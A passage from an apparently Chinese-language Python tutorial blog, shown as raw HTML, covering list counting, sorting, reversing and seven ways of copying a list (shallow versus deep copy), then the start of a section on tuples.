In [62]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;63]: len(systems)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 统计个数&lt;/span&gt;
Out[63]: 5
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;统计列表中某个元素的个数：&lt;/strong&gt;使用count()方法统计指定元素的个数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
In [64]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;65]: systems.count(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用count()方法计数&lt;/span&gt;
Out[65]: 1&lt;span&gt;

In [&lt;/span&gt;66]: systems.count(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
Out[&lt;/span&gt;66]: 3
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;正排序：&lt;/strong&gt;按照ASC码进行从小到大的排序：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
In [67&lt;span&gt;]: systems
Out[&lt;/span&gt;67]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;68]: systems.sort()   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用sort()方法，从小到大排序&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;69&lt;span&gt;]: systems
Out[&lt;/span&gt;69]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;逆排序：&lt;/strong&gt;按照ASC码进行从大到小的排序：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
In [69&lt;span&gt;]: systems
Out[&lt;/span&gt;69]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;70]: systems.reverse()   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;使用reverse()方法，从大到小排序&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;71&lt;span&gt;]: systems
Out[&lt;/span&gt;71]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;注意：Python3中，列表例的数据类型一致才可以排序，否则会报错&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;9.列表拷贝&lt;/h4&gt;
&lt;p&gt;关于列表的拷贝，有好多种方法，每一种方法都有差别，一起来看下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法1： &lt;span class=&quot;cnblogs_code&quot;&gt;b = a   &lt;span&gt;#&lt;/span&gt; &lt;span&gt;a是一个列表&lt;/span&gt;&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
In [87]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;88]: b = a         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 把a拷贝给b&lt;/span&gt;
&lt;span&gt;  
In [&lt;/span&gt;89]: id(a)         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可以看到a和b的地址相同，指向同一块地址&lt;/span&gt;
Out[89]: 2762625492040&lt;span&gt;

In [&lt;/span&gt;90&lt;span&gt;]: id(b)
Out[&lt;/span&gt;90]: 2762625492040&lt;span&gt;

In [&lt;/span&gt;91]: a.append(5)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 列表a追加元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;92&lt;span&gt;]: a
Out[&lt;/span&gt;92]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;93]: b             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 列表b也改变了，还记得第五节在讲变量时化的那个图吗？&lt;/span&gt;
Out[93]: [1, 2, 3, 5]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;方法二： &lt;span class=&quot;cnblogs_code&quot;&gt;b = a[:]&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
In [94]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;95]: b = a[:]   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 把a列表拷贝给b&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;96]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;97&lt;span&gt;]: a
Out[&lt;/span&gt;97]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;98]: b          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可以看到，b并没有跟着改变&lt;/span&gt;
Out[98]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;99]: id(a)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 说明a和b指向不同的地址&lt;/span&gt;
Out[99]: 2762624748936&lt;span&gt;

In [&lt;/span&gt;100&lt;span&gt;]: id(b)
Out[&lt;/span&gt;100]: 2762626722504
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但是~~&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
In [107]: a = [1,2,[3]]        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; a列表里面包含了一个新的列表&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;108]: b =&lt;span&gt; a[:]

In [&lt;/span&gt;109]: a[-1].append(5)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 子列表追缴一个新的元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;110]: a.append(6)          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; a列表追加一个新的元素&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;111&lt;span&gt;]: a
Out[&lt;/span&gt;111]: [1, 2, [3, 5], 6]    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; a变成了这样&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;112]: b                    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 但是b的子列表却跟着改变了，见鬼了！&lt;/span&gt;
Out[112]: [1, 2, [3, 5&lt;span&gt;]]

In [&lt;/span&gt;113]: id(a)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; a和b指向的地址并不一样&lt;/span&gt;
Out[113]: 2762626869896&lt;span&gt;

In [&lt;/span&gt;114&lt;span&gt;]: id(b)
Out[&lt;/span&gt;114]: 2762602977160
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;虽然b = a[:] 这种方式可以拷贝出一个新的列表，但是当列表中包含子列表的时候，拷贝出来的新列表中的子列表会跟着改变╮(╯▽╰)╭，应用的时候一定要注意呐&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方式三： &lt;span class=&quot;cnblogs_code&quot;&gt;b = list(a)&lt;/span&gt;  &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
In [115]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;116]: b =&lt;span&gt; list(a)

In [&lt;/span&gt;117]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;118&lt;span&gt;]: a
Out[&lt;/span&gt;118]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;119&lt;span&gt;]: b
Out[&lt;/span&gt;119]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;120]: a = [1,2,[3&lt;span&gt;]]

In [&lt;/span&gt;121]: b =&lt;span&gt; list(a)

In [&lt;/span&gt;122]: a[-1].append(5&lt;span&gt;)

In [&lt;/span&gt;123]: a.append(6&lt;span&gt;)

In [&lt;/span&gt;124&lt;span&gt;]: a
Out[&lt;/span&gt;124]: [1, 2, [3, 5], 6&lt;span&gt;]

In [&lt;/span&gt;125&lt;span&gt;]: b
Out[&lt;/span&gt;125]: [1, 2, [3, 5&lt;span&gt;]]

In [&lt;/span&gt;126&lt;span&gt;]: id(a)
Out[&lt;/span&gt;126]: 2762627298696&lt;span&gt;

In [&lt;/span&gt;127&lt;span&gt;]: id(b)
Out[&lt;/span&gt;127]: 2762627301000
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到与方法二大同小异=====(￣▽￣*)b&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法四： &lt;span class=&quot;cnblogs_code&quot;&gt;b = a * 1   &lt;span&gt;#&lt;/span&gt; &lt;span&gt;a为列表&lt;/span&gt;&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
In [128]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;129]: b = a * 1&lt;span&gt;

In [&lt;/span&gt;130]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;131&lt;span&gt;]: a
Out[&lt;/span&gt;131]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;132&lt;span&gt;]: b
Out[&lt;/span&gt;132]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;133]: a = [1,2,[3&lt;span&gt;]]

In [&lt;/span&gt;134]: b = a * 1&lt;span&gt;

In [&lt;/span&gt;135]: a[-1].append(5&lt;span&gt;)

In [&lt;/span&gt;136]: a.append(6&lt;span&gt;)

In [&lt;/span&gt;137&lt;span&gt;]: a
Out[&lt;/span&gt;137]: [1, 2, [3, 5], 6&lt;span&gt;]

In [&lt;/span&gt;138&lt;span&gt;]: b
Out[&lt;/span&gt;138]: [1, 2, [3, 5&lt;span&gt;]]

In [&lt;/span&gt;139&lt;span&gt;]: id(a)
Out[&lt;/span&gt;139]: 2762627326280&lt;span&gt;

In [&lt;/span&gt;140&lt;span&gt;]: id(b)
Out[&lt;/span&gt;140]: 2762627611016
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，与方法二、方法三大同小异,,ԾㅂԾ,,&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法五： &lt;span class=&quot;cnblogs_code&quot;&gt;b = a.copy()    &lt;span&gt;#&lt;/span&gt; &lt;span&gt;a是列表&lt;/span&gt;&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
In [170]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;171]: b =&lt;span&gt; a.copy()

In [&lt;/span&gt;172]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;173&lt;span&gt;]: a
Out[&lt;/span&gt;173]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;174&lt;span&gt;]: b
Out[&lt;/span&gt;174]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;175]: a = [1,2,[3&lt;span&gt;]]

In [&lt;/span&gt;176]: b =&lt;span&gt; a.copy()

In [&lt;/span&gt;177]: a[-1].append(5&lt;span&gt;)

In [&lt;/span&gt;178]: a.append(6&lt;span&gt;)

In [&lt;/span&gt;179&lt;span&gt;]: a
Out[&lt;/span&gt;179]: [1, 2, [3, 5], 6&lt;span&gt;]

In [&lt;/span&gt;180&lt;span&gt;]: b
Out[&lt;/span&gt;180]: [1, 2, [3, 5&lt;span&gt;]]

In [&lt;/span&gt;181&lt;span&gt;]: id(a)
Out[&lt;/span&gt;181]: 2762628171912&lt;span&gt;

In [&lt;/span&gt;182&lt;span&gt;]: id(b)
Out[&lt;/span&gt;182]: 2762628181320
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，与方法二、方法三、方法四大同小异(ˉ▽ˉ；)...&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法六： &lt;span class=&quot;cnblogs_code&quot;&gt;b = copy.copy(a)    &lt;span&gt;#&lt;/span&gt; &lt;span&gt;a为列表&lt;/span&gt;&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
In [141]: &lt;span&gt;import&lt;/span&gt; copy     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 需要导入 copy 模块&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;142]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;143]: b =&lt;span&gt; copy.copy(a)

In [&lt;/span&gt;144]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;145&lt;span&gt;]: a
Out[&lt;/span&gt;145]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;146&lt;span&gt;]: b
Out[&lt;/span&gt;146]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;147]: a = [1,2,[3&lt;span&gt;]]

In [&lt;/span&gt;148]: b =&lt;span&gt; copy.copy(a)

In [&lt;/span&gt;149]: a[-1].append(5&lt;span&gt;)

In [&lt;/span&gt;150]: a.append(6&lt;span&gt;)

In [&lt;/span&gt;151&lt;span&gt;]: a
Out[&lt;/span&gt;151]: [1, 2, [3, 5], 6&lt;span&gt;]

In [&lt;/span&gt;152&lt;span&gt;]: b
Out[&lt;/span&gt;152]: [1, 2, [3, 5&lt;span&gt;]]

In [&lt;/span&gt;153&lt;span&gt;]: id(a)
Out[&lt;/span&gt;153]: 2762602926984&lt;span&gt;

In [&lt;/span&gt;154&lt;span&gt;]: id(b)
Out[&lt;/span&gt;154]: 2762627609608
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，与方法二、方法三、方法四、方法五大同小异(ˉ▽ˉ；)...&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法七： &lt;span class=&quot;cnblogs_code&quot;&gt;b = copy.deepcopy(a)    &lt;span&gt;#&lt;/span&gt; &lt;span&gt;a为列表&lt;/span&gt;&lt;/span&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
In [155]: &lt;span&gt;import&lt;/span&gt;&lt;span&gt; copy

In [&lt;/span&gt;156]: a = [1,2,3&lt;span&gt;]

In [&lt;/span&gt;157]: b =&lt;span&gt; copy.deepcopy(a)

In [&lt;/span&gt;158]: a.append(5&lt;span&gt;)

In [&lt;/span&gt;159&lt;span&gt;]: a
Out[&lt;/span&gt;159]: [1, 2, 3, 5&lt;span&gt;]

In [&lt;/span&gt;160&lt;span&gt;]: b
Out[&lt;/span&gt;160]: [1, 2, 3&lt;span&gt;]

In [&lt;/span&gt;161]: a = [1,2,[3&lt;span&gt;]]

In [&lt;/span&gt;162]: b =&lt;span&gt; copy.deepcopy(a)

In [&lt;/span&gt;163]: a[-1].append(5&lt;span&gt;)

In [&lt;/span&gt;164]: a.append(6&lt;span&gt;)

In [&lt;/span&gt;165&lt;span&gt;]: a
Out[&lt;/span&gt;165]: [1, 2, [3, 5], 6&lt;span&gt;]

In [&lt;/span&gt;166]: b                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 这次b终于没有被改变&lt;/span&gt;
Out[166]: [1, 2, [3&lt;span&gt;]]

In [&lt;/span&gt;167&lt;span&gt;]: id(a)
Out[&lt;/span&gt;167]: 2762627600712&lt;span&gt;

In [&lt;/span&gt;168&lt;span&gt;]: id(b)
Out[&lt;/span&gt;168]: 2762625604936
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;哇~~这一次b列表终于没有跟着改变ヾ(≧▽≦*)o&lt;/p&gt;
&lt;p&gt;从以上七种方法可以看到，方法一最不推荐使用，方法二、方法三、方法四、方法五、方法六大同小异，都是复制列表后得到一个新的列表，但是一点列表中含有子列表，复制过来的列表中的子列表还是会跟着改变，方法七才会真正的做到完全复制且不是任何影响。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;来一个列表的总结：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
a.append(x)              &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 列表a追加元素x&lt;/span&gt;
a.clear()                &lt;span&gt;# 将列表a清空&lt;/span&gt;
a.copy()                 &lt;span&gt;# 拷贝列表a&lt;/span&gt;
a.count(x)               &lt;span&gt;# 对a列表的元素x计数&lt;/span&gt;
a.extend(b)              &lt;span&gt;# 把b列表扩展到a列表中&lt;/span&gt;
a.index(x)               &lt;span&gt;# 查询a列表中x元素的索引&lt;/span&gt;
a.insert(n,x)            &lt;span&gt;# 在列表a的第n个位置处插入元素x&lt;/span&gt;
a.pop()                  &lt;span&gt;# 将列表a的末尾元素删除，并返回这个元素&lt;/span&gt;
a.remove(x)              &lt;span&gt;# 将列表a的元素x删除&lt;/span&gt;
a.reverse()              &lt;span&gt;# 按ASC码进行从大到小的排序&lt;/span&gt;
a.sort()                 &lt;span&gt;# 按ASC码进行从小到大的排序&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;二、元组&lt;/h3&gt;
&lt;p&gt;元组与列表相似，只不过元组不能修改其内部元素。列表使用方括号，而元组使用圆括号。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;
&lt;pre&gt;
In [193&lt;span&gt;]: dir(tuple)
Out[&lt;/span&gt;193&lt;span&gt;]:
[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__add__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__class__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__contains__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__delattr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__dir__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__doc__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__eq__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__format__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__ge__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__getattribute__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__getitem__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__getnewargs__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__gt__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__hash__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__iter__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__le__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__len__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__lt__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__mul__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__ne__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__new__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__reduce__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__reduce_ex__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__repr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__rmul__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__setattr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__sizeof__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__str__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__subclasshook__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;count&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，元组的方法少的可怜，只有 count 和 index 方法&lt;/p&gt;
&lt;h4&gt;1.初始化元组&lt;/h4&gt;
&lt;p&gt;与列表类似，用一对圆括号括起来，元素之间用逗号分隔开,&lt;span&gt;需要注意的是元组最后一定要加逗号&lt;/span&gt;：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
In [184]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;&lt;span&gt;)

In [&lt;/span&gt;185]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666,&lt;span&gt;)

In [&lt;/span&gt;186]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666, [1, 3,5&lt;span&gt;],)

In [&lt;/span&gt;187]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666, [1, 3,5], (2,4,6&lt;span&gt;),)

